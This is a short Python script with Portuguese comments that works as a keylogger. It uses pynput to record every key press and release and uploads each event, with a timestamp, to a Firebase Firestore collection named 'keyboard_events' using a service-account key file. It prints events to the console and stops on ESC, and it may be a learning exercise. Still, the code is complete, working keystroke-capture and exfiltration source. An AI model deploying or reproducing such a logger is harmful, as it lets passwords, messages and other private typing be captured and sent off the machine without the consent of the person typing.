from pynput import keyboard
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore

# Inicializa Firebase
cred = credentials.Certificate("../../../Downloads/key.json")  # Caminho correto para a chave
firebase_admin.initialize_app(cred)

# Conectar ao Firestore
db = firestore.client()

def log_data(event, value):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    db.collection("keyboard_events").add({
        "timestamp": timestamp,
        "event": event,
        "value": value
    })
    
    print(f"Log enviado: {timestamp} | {event} | {value}")

# Detecta quando uma tecla é pressionada
def on_press(key):
    try:
        print(f'Alphanumeric key {key.char} pressed')
        log_data("KeyPressed", key.char)
    except AttributeError:
        print(f'Special key {key} pressed')
        log_data("SpecialKeyPressed", str(key))

# Detecta quando uma tecla é solta
def on_release(key):
    print(f'{key} released')
    
    log_data("KeyReleased", str(key))
    
    if key == keyboard.Key.esc:
        print('Gracefully Stopping!')
        return False  # Para o listener ao soltar ESC

# Coleta eventos de teclado
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Modo não bloqueante
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
